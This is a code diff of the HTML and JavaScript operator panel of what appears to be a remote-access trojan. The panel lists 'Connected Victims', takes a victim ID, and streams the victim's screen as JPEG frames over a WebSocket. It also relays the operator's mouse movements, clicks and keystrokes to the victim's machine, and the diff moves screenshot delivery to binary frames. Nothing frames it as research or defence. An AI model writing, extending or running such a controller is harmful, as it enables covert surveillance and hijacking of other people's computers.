@@ -20,17 +20,12 @@
 
     #connectPanel {
       position: absolute;
-      top: 50%;
-      left: 50%;
+      top: 50%; left: 50%;
       transform: translate(-50%, -50%);
       z-index: 100;
       text-align: center;
     }
-
-    #connectPanel.hidden {
-      display: none;
-    }
-
+    #connectPanel.hidden { display: none; }
     #connectPanel input {
       background: #1a1a1a;
       border: 1px solid #333;
@@ -42,11 +37,7 @@
       outline: none;
       text-align: center;
     }
-
-    #connectPanel input:focus {
-      border-color: #0f0;
-    }
-
+    #connectPanel input:focus { border-color: #0f0; }
     #connectPanel button {
       background: #0a0;
       color: #000;
@@ -58,16 +49,8 @@
       margin-top: 12px;
       cursor: pointer;
     }
-
-    #connectPanel button:hover {
-      background: #0c0;
-    }
-
-    #connectPanel .hint {
-      color: #666;
-      font: 13px sans-serif;
-      margin-top: 10px;
-    }
+    #connectPanel button:hover { background: #0c0; }
+    #connectPanel .hint { color: #666; font: 13px sans-serif; margin-top: 10px; }
 
     #wrapper {
       position: relative;
@@ -75,20 +58,14 @@
       overflow: hidden;
       display: none;
     }
+    #wrapper.active { display: block; }
+    #wrapper.locked { cursor: none; }
 
-    #wrapper.active {
-      display: block;
-    }
-
-    #wrapper.locked {
-      cursor: none;
-    }
-
-    #screen {
+    #screenCanvas {
       display: block;
       width: 100%;
       height: 100%;
-      background: #000;
+      background: #111;
     }
 
     #overlay {
@@ -100,11 +77,7 @@
       pointer-events: none;
       z-index: 10;
     }
-
-    #overlay.hidden {
-      display: none;
-    }
-
+    #overlay.hidden { display: none; }
     #overlay span {
       color: #fff;
       font: 20px sans-serif;
@@ -115,16 +88,11 @@
       text-align: center;
       line-height: 1.5;
     }
-
-    #overlay .hint {
-      color: #0f0;
-      font-size: 14px;
-    }
+    #overlay .hint { color: #0f0; font-size: 14px; }
 
     #info {
       position: fixed;
-      bottom: 6px;
-      right: 6px;
+      bottom: 6px; right: 6px;
       font-size: 11px;
       color: #888;
       background: rgba(0,0,0,0.6);
@@ -133,29 +101,23 @@
       pointer-events: none;
       z-index: 999;
     }
-
     #info.on { color: #4c4; }
     #info.off { color: #c44; }
     #info.wait { color: #cc4; }
 
     #victimList {
       position: fixed;
-      top: 10px;
-      right: 10px;
+      top: 10px; right: 10px;
       z-index: 50;
-      background: rgba(0,0,0,0.8);
+      background: rgba(0,0,0,0.85);
       border: 1px solid #333;
       border-radius: 6px;
       padding: 10px;
-      min-width: 200px;
+      min-width: 220px;
       max-height: 300px;
       overflow-y: auto;
     }
-
-    #victimList.hidden {
-      display: none;
-    }
-
+    #victimList.hidden { display: none; }
     #victimList .title {
       color: #888;
       font: 12px sans-serif;
@@ -163,7 +125,6 @@
       text-transform: uppercase;
       letter-spacing: 1px;
     }
-
     .victim-entry {
       color: #aaa;
       font: 13px monospace;
@@ -172,32 +133,15 @@
       border-radius: 3px;
       transition: background 0.15s;
     }
-
-    .victim-entry:hover {
-      background: #222;
-      color: #0f0;
-    }
-
-    .victim-entry.selected {
-      background: #0a0;
-      color: #000;
-      font-weight: bold;
-    }
-
-    .victim-entry.online {
-      color: #4c4;
-    }
-
+    .victim-entry:hover { background: #222; color: #0f0; }
+    .victim-entry.selected { background: #0a0; color: #000; font-weight: bold; }
     .victim-entry .status-dot {
       display: inline-block;
-      width: 8px;
-      height: 8px;
+      width: 8px; height: 8px;
       border-radius: 50%;
       margin-right: 6px;
+      background: #4c4;
     }
-
-    .victim-entry .status-dot.online { background: #4c4; }
-    .victim-entry .status-dot.offline { background: #c44; }
   </style>
 </head>
 <body>
@@ -206,11 +150,11 @@
       <input id="victimIdInput" type="text" placeholder="Enter Victim ID..." autocomplete="off" spellcheck="false"/>
       <br/>
       <button id="connectBtn">Connect</button>
-      <div class="hint">or select from connected victims</div>
+      <div class="hint">or click a victim from the list</div>
     </div>
 
     <div id="wrapper">
-      <img id="screen" draggable="false" alt="Remote Desktop"/>
+      <canvas id="screenCanvas"></canvas>
       <div id="overlay"><span>Click here to lock mouse<br><small class="hint">ESC to unlock</small></span></div>
     </div>
 
@@ -222,7 +166,6 @@
 
   <script>
     (function() {
-      // Determine WebSocket URL
       const loc = window.location;
       const wsUrl = (loc.protocol === 'https:' ? 'wss:' : 'ws:') + '//' + loc.host;
 
@@ -237,12 +180,13 @@
       let accDx = 0;
       let accDy = 0;
       let sendTimer = null;
-      let frameBusy = false;
-      let frameTimer = null;
-      let connectedVictims = {};
-      let imageBuffer = null;
 
-      const img = document.getElementById('screen');
+      // Canvas
+      const canvas = document.getElementById('screenCanvas');
+      const ctx = canvas.getContext('2d', { alpha: false });
+      let latestFrame = null;     // Uint8Array (JPEG bytes only, no header)
+      let frameReady = false;
+
       const wrapper = document.getElementById('wrapper');
       const overlay = document.getElementById('overlay');
       const info = document.getElementById('info');
@@ -258,11 +202,44 @@
         const scale = Math.min(vw / capW, vh / capH);
         wrapper.style.width = (capW * scale) + 'px';
         wrapper.style.height = (capH * scale) + 'px';
+        canvas.width = capW;
+        canvas.height = capH;
+        canvas.style.width = (capW * scale) + 'px';
+        canvas.style.height = (capH * scale) + 'px';
         ratioX = capW / (capW * scale);
         ratioY = capH / (capH * scale);
       }
-
       window.addEventListener('resize', sizeWrapper);
+
+      // ─── RENDER LOOP (decodes JPEG and draws to canvas) ───
+      function renderFrame() {
+        if (!latestFrame || !frameReady) {
+          requestAnimationFrame(renderFrame);
+          return;
+        }
+
+        // Only render the latest — clear the flag so we don't re-render same frame
+        frameReady = false;
+        const data = latestFrame;
+        
+        try {
+          const blob = new Blob([data], { type: 'image/jpeg' });
+          const url = URL.createObjectURL(blob);
+          const img = new Image();
+          img.onload = function() {
+            ctx.drawImage(img, 0, 0);
+            URL.revokeObjectURL(url);
+          };
+          img.onerror = function() {
+            URL.revokeObjectURL(url);
+          };
+          img.src = url;
+        } catch(e) {
+          // silently fail
+        }
+
+        requestAnimationFrame(renderFrame);
+      }
 
       // ─── POINTER LOCK ───
       wrapper.addEventListener('click', function() {
@@ -284,7 +261,7 @@
         info.textContent = capW + 'x' + capH + ' Lock failed';
       });
 
-      // ─── MOUSE DELTAS ───
+      // ─── MOUSE ───
       document.addEventListener('mousemove', function(e) {
         if (!locked || !currentVictimId) return;
         accDx += (e.movementX || 0);
@@ -294,17 +271,11 @@
       sendTimer = setInterval(function() {
         if (!locked || !currentVictimId || (accDx === 0 && accDy === 0)) return;
         if (socket && socket.readyState === WebSocket.OPEN) {
-          socket.send(JSON.stringify({
-            type: 'mousedelta',
-            dx: accDx * ratioX,
-            dy: accDy * ratioY
-          }));
+          socket.send(JSON.stringify({ type: 'mousedelta', dx: accDx * ratioX, dy: accDy * ratioY }));
         }
-        accDx = 0;
-        accDy = 0;
+        accDx = 0; accDy = 0;
       }, 50);
 
-      // ─── CLICKS ───
       wrapper.addEventListener('click', function(e) {
         if (locked && currentVictimId && socket && socket.readyState === WebSocket.OPEN) {
           socket.send(JSON.stringify({ type: 'click', btn: 'left' }));
@@ -326,10 +297,7 @@
             (e.ctrlKey && 'rRwWtTnN'.includes(e.key)) ||
             (e.metaKey && 'rRwWtTnN'.includes(e.key))) return;
         if (!currentVictimId) return;
-        if (e.key === 'Escape' && locked) {
-          document.exitPointerLock();
-          return;
-        }
+        if (e.key === 'Escape' && locked) { document.exitPointerLock(); return; }
         if (socket && socket.readyState === WebSocket.OPEN) {
           socket.send(JSON.stringify({ type: 'keydown', key: e.key }));
         }
@@ -342,111 +310,87 @@
       });
 
       // ─── VICTIM LIST UI ───
-      function renderVictimList() {
-        const entries = Object.entries(connectedVictims);
-        if (entries.length === 0) {
-          victimList.classList.add('hidden');
-          return;
-        }
-        victimList.classList.remove('hidden');
+      window.__victims = {};
 
+      function renderVictimList() {
+        const entries = Object.entries(window.__victims);
+        if (entries.length === 0) { victimList.classList.add('hidden'); return; }
+        victimList.classList.remove('hidden');
         let html = '<div class="title">Connected Victims</div>';
-        for (const [id, info] of entries) {
-          const online = info.online !== false;
+        for (const [id, v] of entries) {
           const selected = id === selectedVictimId;
-          html += '<div class="victim-entry' +
-            (online ? ' online' : '') +
-            (selected ? ' selected' : '') +
-            '" data-id="' + id + '">' +
-            '<span class="status-dot ' + (online ? 'online' : 'offline') + '"></span>' +
-            id +
-            (info.screen ? ' <span style="color:#666;font-size:11px">' + info.screen + '</span>' : '') +
+          html += '<div class="victim-entry' + (selected ? ' selected' : '') + '" data-id="' + id + '">' +
+            '<span class="status-dot"></span>' + id +
+            (v.screen ? ' <span style="color:#666;font-size:11px">' + v.screen + '</span>' : '') +
             '</div>';
         }
         victimList.innerHTML = html;
-
-        // Click handlers
         victimList.querySelectorAll('.victim-entry').forEach(el => {
           el.addEventListener('click', function() {
             const id = this.dataset.id;
-            if (id && connectedVictims[id] && connectedVictims[id].online !== false) {
-              connectToVictim(id);
-            }
+            if (id) connectToVictim(id);
           });
         });
       }
 
-      function updateVictimList(id, data) {
-        if (!connectedVictims[id]) {
-          connectedVictims[id] = { online: true, screen: null };
-        }
-        if (data) {
-          if (data.screenWidth) connectedVictims[id].screen = data.screenWidth + 'x' + data.screenHeight;
-          if (data.online !== undefined) connectedVictims[id].online = data.online;
-        }
-        renderVictimList();
-      }
-
-      function removeVictim(id) {
-        delete connectedVictims[id];
-        if (selectedVictimId === id) {
-          selectedVictimId = null;
-          currentVictimId = null;
-          wrapper.classList.remove('active');
-          connectPanel.classList.remove('hidden');
-          if (locked) document.exitPointerLock();
-          info.textContent = 'Victim disconnected';
-          info.className = 'off';
+      function updateVictimList(victims) {
+        window.__victims = {};
+        for (const v of victims) {
+          window.__victims[v.id] = { screen: v.screenWidth + 'x' + v.screenHeight };
         }
         renderVictimList();
       }
 
       // ─── CONNECT TO VICTIM ───
       function connectToVictim(id) {
-        if (!id) return;
-        if (currentVictimId === id) return;
-
+        if (!id || currentVictimId === id) return;
         selectedVictimId = id;
         currentVictimId = id;
-
         info.textContent = 'Connecting to ' + id + '...';
         info.className = 'wait';
         connectPanel.classList.add('hidden');
-
         if (socket && socket.readyState === WebSocket.OPEN) {
-          socket.send(JSON.stringify({
-            type: 'register_viewer',
-            victimId: id
-          }));
+          socket.send(JSON.stringify({ type: 'register_viewer', victimId: id }));
         }
-
         renderVictimList();
       }
 
       // ─── WEBSOCKET ───
       function connectSocket() {
         socket = new WebSocket(wsUrl);
+        socket.binaryType = 'arraybuffer';
 
         socket.onopen = function() {
           info.textContent = 'Connected. Select a victim.';
           info.className = 'on';
-
-          // Re-register viewer if we had a target
           if (selectedVictimId) {
-            socket.send(JSON.stringify({
-              type: 'register_viewer',
-              victimId: selectedVictimId
-            }));
+            socket.send(JSON.stringify({ type: 'register_viewer', victimId: selectedVictimId }));
           }
         };
 
         socket.onmessage = function(evt) {
+          // BINARY FRAME (screenshot)
+          if (evt.data instanceof ArrayBuffer) {
+            const buf = new Uint8Array(evt.data);
+            if (buf.length < 8) return;
+
+            // Skip cursor position (first 8 bytes) — we draw it on the victim side already
+            // Just store the JPEG bytes for rendering
+            latestFrame = buf.slice(8);
+            frameReady = true;
+            return;
+          }
+
+          // TEXT FRAMES
           let msg;
           try { msg = JSON.parse(evt.data); } catch (e) { return; }
 
           switch (msg.type) {
+            case 'victim_list':
+              updateVictimList(msg.victims || []);
+              break;
 
-            case 'victim_ready': {
+            case 'victim_ready':
               capW = msg.screenWidth || 1920;
               capH = msg.screenHeight || 1080;
               currentVictimId = msg.victimId;
@@ -454,44 +398,26 @@
               wrapper.classList.add('active');
               info.textContent = capW + 'x' + capH + ' Click to lock';
               info.className = 'on';
-
-              updateVictimList(msg.victimId, {
-                screenWidth: capW,
-                screenHeight: capH,
-                online: true
-              });
               break;
-            }
 
-            case 'waiting': {
+            case 'waiting':
               info.textContent = 'Waiting for victim: ' + msg.victimId + '...';
               info.className = 'wait';
               break;
-            }
 
-            case 'screenshot': {
-              const binary = atob(msg.data);
-              const len = binary.length;
-              const bytes = new Uint8Array(len);
-              for (let i = 0; i < len; i++) {
-                bytes[i] = binary.charCodeAt(i);
-              }
-              const blob = new Blob([bytes], { type: 'image/jpeg' });
-              const url = URL.createObjectURL(blob);
-              if (img._url) URL.revokeObjectURL(img._url);
-              img._url = url;
-              img.src = url;
-              break;
-            }
-
-            case 'victim_disconnected': {
+            case 'victim_disconnected':
               if (msg.victimId === currentVictimId) {
-                removeVictim(msg.victimId);
-              } else {
-                updateVictimList(msg.victimId, { online: false });
+                currentVictimId = null;
+                wrapper.classList.remove('active');
+                connectPanel.classList.remove('hidden');
+                if (locked) document.exitPointerLock();
+                info.textContent = 'Victim disconnected';
+                info.className = 'off';
+                latestFrame = null;
+                frameReady = false;
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
               }
               break;
-            }
           }
         };
 
@@ -508,17 +434,17 @@
         };
       }
 
-      // ─── ENTER / BUTTON ───
+      // ─── UI BINDINGS ───
       victimIdInput.addEventListener('keydown', function(e) {
         if (e.key === 'Enter') connectToVictim(victimIdInput.value.trim());
       });
-
       connectBtn.addEventListener('click', function() {
         connectToVictim(victimIdInput.value.trim());
       });
 
       // ─── INIT ───
       connectSocket();
+      requestAnimationFrame(renderFrame);
     })();
   </script>
 </body>
